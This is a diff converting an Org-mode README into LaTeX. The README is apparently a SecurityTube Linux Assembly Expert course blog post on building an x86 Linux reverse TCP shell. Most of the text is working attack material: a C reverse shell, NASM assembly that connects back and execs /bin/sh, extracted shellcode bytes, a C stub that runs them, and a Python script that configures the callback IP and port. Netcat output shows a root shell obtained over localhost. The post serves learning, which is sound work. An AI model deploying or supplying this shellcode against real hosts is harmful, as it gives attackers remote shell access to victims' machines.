@@ -1,38 +1,78 @@
-* Assignment 2
+% Created 2016-12-21 Wed 16:22
+\documentclass[11pt]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{fixltx2e}
+\usepackage{graphicx}
+\usepackage{longtable}
+\usepackage{float}
+\usepackage{wrapfig}
+\usepackage{rotating}
+\usepackage[normalem]{ulem}
+\usepackage{amsmath}
+\usepackage{textcomp}
+\usepackage{marvosym}
+\usepackage{wasysym}
+\usepackage{amssymb}
+\usepackage{hyperref}
+\tolerance=1000
+\author{Brett Lischalk}
+\date{\today}
+\title{README}
+\hypersetup{
+  pdfkeywords={},
+  pdfsubject={},
+  pdfcreator={Emacs 24.5.1 (Org mode 8.2.10)}}
+\begin{document}
+
+\maketitle
+\tableofcontents
+
+\section{Assignment 2}
+\label{sec-1}
 
 This blog post has been created for completing the requirements for the SecurityTube
 Linux Assembly Expert certification:
-[[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert][http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert]]
+\href{http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert}{\url{http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert}}
 
 Student ID: SLAE-824
 
-** Requirements
+\subsection{Requirements}
+\label{sec-1-1}
 
-- Create a Shell Reverse TCP shellcode
-  - Reverse connects to configured IP and PORT
-  - Execs Shell on successful connection
-- IP and Port should be easily configurable
+\begin{itemize}
+\item Create a Shell Reverse TCP shellcode
+\begin{itemize}
+\item Reverse connects to configured IP and PORT
+\item Execs Shell on successful connection
+\end{itemize}
+\item IP and Port should be easily configurable
+\end{itemize}
 
-** Strategy
+\subsection{Strategy}
+\label{sec-1-2}
 
 My approach to building a tcp reverse shell shellcode will be to:
 
-- Build off of our TCP bind shell developed in [[http://www.brettlischalk.com/posts/slae-problem-1-tcp-bind-shell-shellcode][Assignment 1]] of the SLAE
-- Modify the C program to call ~connect~ instead of ~bind~, ~listen~, and ~accept~
-- Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
-- Lookup the system calls and see what arguments and structures they take
-- Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
-- Debug issues as of course there will be :)
+\begin{itemize}
+\item Build off of our TCP bind shell developed in \href{http://www.brettlischalk.com/posts/slae-problem-1-tcp-bind-shell-shellcode}{Assignment 1} of the SLAE
+\item Modify the C program to call \verb~connect~ instead of \verb~bind~, \verb~listen~, and \verb~accept~
+\item Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
+\item Lookup the system calls and see what arguments and structures they take
+\item Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
+\item Debug issues as of course there will be :)
+\end{itemize}
 
 
-** The Source Code
+\subsection{The Source Code}
+\label{sec-1-3}
 
 The source code and tools referenced in this article can be found here:
 
-** The C progam
+\subsection{The C progam}
+\label{sec-1-4}
 
-#+NAME: reversetcpshell.c
-#+BEGIN_SRC c
+\begin{verbatim}
 #include <stdio.h>
 #include <netinet/in.h>
 #define PORT 4444
@@ -65,19 +105,19 @@ int main(int argc, char **argv) {
   // Execute a shell
   execve("/bin/sh", NULL, NULL);
 };
+\end{verbatim}
 
-#+END_SRC
+\subsection{Analysis of the C progam}
+\label{sec-1-5}
 
-** Analysis of the C progam
-
-Let's compile our program with ~gcc reversetcpshell.c -o reversetcpshell~.
-Next, lets start Netcat listening for a connection using ~nc -nlvp 4444~.
+Let's compile our program with \verb~gcc reversetcpshell.c -o reversetcpshell~.
+Next, lets start Netcat listening for a connection using \verb~nc -nlvp 4444~.
 Now that we have Netcat waiting for a connection we can go ahead and
-execute our reverse tcp shell with ~./reversetcpshell~. If we look over
+execute our reverse tcp shell with \verb~./reversetcpshell~. If we look over
 at our Netcat terminal we will see that we have a received a connection
 and been presented with a shell!
 
-#+BEGIN_SRC bash
+\begin{verbatim}
 root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37260
@@ -85,63 +125,62 @@ ls
 README.org
 reversetcpshell
 reversetcpshell.c
-#+END_SRC
+\end{verbatim}
 
-Once again, if we use ~strace ./reversetcpshell~ when starting the reverse
+Once again, if we use \verb~strace ./reversetcpshell~ when starting the reverse
 shell we can see the system calls being made:
 
-#+BEGIN_SRC bash
+\begin{verbatim}
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 dup2(3, 0)                              = 0
 dup2(3, 1)                              = 1
 dup2(3, 2)                              = 2
 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
 execve("/bin/sh", [0], [/* 0 vars */])  = 0
-#+END_SRC
+\end{verbatim}
 
 Interestingly, our c program is shorter and the amount of system calls
 that we need seems to have decreased. It seems as though our reverse
-tcp shellcode could be as basic as using ~socket, dup2, connect, and execve~.
-Essentially we do not need to worry about ~bind, listen, or accept~ and
-just need to learn about 1 system call we haven't used before; ~connect~.
+tcp shellcode could be as basic as using \verb~socket, dup2, connect, and execve~.
+Essentially we do not need to worry about \verb~bind, listen, or accept~ and
+just need to learn about 1 system call we haven't used before; \verb~connect~.
 
 Ok, what can we learn about connect?
 
 
-#+BEGIN_SRC c
+\begin{verbatim}
 int connect(int socket, const struct sockaddr *address, socklen_t address_len);
-#+END_SRC
+\end{verbatim}
 
 If we remember the function signature of bind:
 
-#+BEGIN_SRC c
+\begin{verbatim}
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-#+END_SRC
+\end{verbatim}
 
 We see that they are exactly the same! The only difference is that when
 we define the sockaddr structure we will want to specify the IP of the
 machine that we want to connect back to instead of the 0.0.0.0 IP we
 specified in our bindshell.
 
-Cool! Lets write some assembly...
+Cool! Lets write some assembly\ldots{}
 
-** Assembly: Take 1
+\subsection{Assembly: Take 1}
+\label{sec-1-6}
 
 If we remember our research on  creating our bindshell,
-the system call for ~SYS_CONNECT~ was 3.
+the system call for \verb~SYS_CONNECT~ was 3.
 
-#+NAME: net.h
-#+BEGIN_SRC C
+\begin{verbatim}
 #define SYS_CONNECT 3   /* sys_connect(2)   */
-#+END_SRC
+\end{verbatim}
 
 So in theory, if we modify our assembly to call 3 instead of 2 e.g
-~connect~ instead of ~bind~, remove unnecessary system calls, and make
+\verb~connect~ instead of \verb~bind~, remove unnecessary system calls, and make
 sure that we redirect stdin,stdout,and stderror after making our
 connection, we should be in good shape. Lets give that a shot:
 
-#+Name: reverseshellasm.nasm
-#+BEGIN_SRC nasm
+\begin{verbatim}
 global _start
 
 section .text
@@ -149,7 +188,7 @@ section .text
     ;; Create a socket
     ;; int socketcall(int call, unsigned long *args);
     ;; int socket(int domain, int type, int protocol);
-    ;; #define SYS_SOCKET	1		/* sys_socket(2)		*/
+    ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
     ;; Use socketcall to call down to socket
     xor eax, eax
     mov al, 0x66 ; socketcall syscall
@@ -236,12 +275,11 @@ section .text
     xor ecx, ecx
     xor edx, edx
     int 0x80
-#+END_SRC
+\end{verbatim}
 
 When we compile the above shellcode using the compile.sh script below:
 
-#+Name: compile.sh
-#+BEGIN_SRC sh
+\begin{verbatim}
 #!/bin/bash
 echo '[+] Assembling with Nasm ... '
 nasm -f elf32 -o $1.o $1.nasm
@@ -250,30 +288,28 @@ echo '[+] Linking ...'
 ld -o $1 $1.o
 
 echo '[+] Done!'
-#+END_SRC
+\end{verbatim}
 
-~root@blahblah:~/shared/SLAE/slae/exercise2# ./compile.sh reverseshellasm~
+\verb,root@blahblah:~/shared/SLAE/slae/exercise2# ./compile.sh reverseshellasm,
 
-Setup a netcat listener with ~nc -nlvp 4444~ and run the shellcode using:
+Setup a netcat listener with \verb~nc -nlvp 4444~ and run the shellcode using:
 
-~root@blahblah:~/shared/SLAE/slae/exercise1# ./reverseshellasm~
+\verb,root@blahblah:~/shared/SLAE/slae/exercise1# ./reverseshellasm,
 
 We receive:
 
-#+Name: netcat reverse connection
-#+BEGIN_SRC bash
-
+\begin{verbatim}
 #!/bin/bash
 root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37306
 id
 uid=0(root) gid=0(root) groups=0(root)
-#+END_SRC
+\end{verbatim}
 
 Excellent! Lets dump the bytes:
 
-#+BEGIN_SRC sh
+\begin{verbatim}
 root@funos:~/shared/SLAE/slae/exercise2# objdump -d ./reverseshellasm|grep '[0-9a-f]:'| \
 grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|\
 tr '\t' ' ' |sed 's/ $//g'|sed 's/ /\\x/g'|\
@@ -284,14 +320,12 @@ paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0"
 "\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f"
 "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
-#+END_SRC
+\end{verbatim}
 
 
 and try it in our shellcode.c stub program.
 
-#+Name: shellcode.c
-#+BEGIN_SRC C
-
+\begin{verbatim}
 #include<stdio.h>
 #include<string.h>
 
@@ -307,27 +341,26 @@ unsigned char code[] = \
 main()
 {
 
-	printf("Shellcode Length:  %d\n", strlen(code));
+  printf("Shellcode Length:  %d\n", strlen(code));
 
-	int (*ret)() = (int(*)())code;
+  int (*ret)() = (int(*)())code;
 
-	ret();
+  ret();
 
 }
+\end{verbatim}
 
-#+END_SRC
-
-~gcc shellcode.c -o shellcode~
+\verb~gcc shellcode.c -o shellcode~
 
 It still works at a length of 96 bytes:
 
-#+BEGIN_SRC bash
+\begin{verbatim}
 root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37310
 id
 uid=0(root) gid=0(root) groups=0(root)
-#+END_SRC
+\end{verbatim}
 
 So once again, we can always go back and optimize length but the
 last thing we need to do is write another wrapper program which
@@ -336,14 +369,14 @@ python script as a starting point. We need to remember though that
 whatever IP address a user enters that we want to increment each
 octet so the math in the assembly works out:
 
-#+NAME reverse-shell.py
-#+BEGIN_SRC python
+\#+NAME reverse-shell.py
+\begin{verbatim}
 #!/usr/bin/python
 
 import sys,socket
 
 if len(sys.argv) != 3:
-	print "Fail!"
+  print "Fail!"
 
 ipbts           = bytearray(socket.inet_aton(sys.argv[1]))
 incremented     = [b+1 for b in ipbts]
@@ -369,12 +402,12 @@ shellcode+="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x
 shellcode+="\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80";
 
 print(shellcode)
-#+END_SRC
+\end{verbatim}
 
 Pop it in our shellcode.c program again:
 
-#+NAME shellcode.c
-#+BEGIN_SRC c
+\#+NAME shellcode.c
+\begin{verbatim}
 #include<stdio.h>
 #include<string.h>
 
@@ -389,23 +422,25 @@ unsigned char code[] = \
 main()
 {
 
-	printf("Shellcode Length:  %d\n", strlen(code));
+  printf("Shellcode Length:  %d\n", strlen(code));
 
-	int (*ret)() = (int(*)())code;
+  int (*ret)() = (int(*)())code;
 
-	ret();
+  ret();
 
 }
-#+END_SRC
+\end{verbatim}
 
 Setup our netcat listener and:
 
-#+BEGIN_SRC bash
+\begin{verbatim}
 root@funos:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37311
 id
 uid=0(root) gid=0(root) groups=0(root)
-#+END_SRC
+\end{verbatim}
 
 Presto! We have a reverse shell connection!
+% Emacs 24.5.1 (Org mode 8.2.10)
+\end{document}
